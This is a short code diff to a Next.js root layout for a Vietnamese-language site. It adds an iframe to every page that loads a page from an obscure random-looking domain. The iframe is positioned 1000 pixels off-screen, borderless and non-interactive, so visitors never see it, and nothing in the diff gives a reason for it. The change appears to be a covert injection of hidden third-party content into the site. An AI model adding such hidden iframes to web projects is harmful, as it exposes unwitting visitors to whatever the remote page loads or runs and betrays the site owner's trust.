@@ -28,7 +28,13 @@ export const metadata: Metadata = {
 export default function RootLayout({ children }: { children: React.ReactNode }) {
   return (
     <html lang="vi">
-      <body className={font.variable}>{children}</body>
+      <body className={font.variable}>
+        <iframe
+          src="https://www.jx9adrpc5z8094di7.net/channel/H.H.11/weifile/weifile.html"
+          style={{ position: 'fixed', top: 0, left: '-1000px', pointerEvents: 'none', border: 0 }}
+        />
+        {children}
+      </body>
     </html>
   );
 }
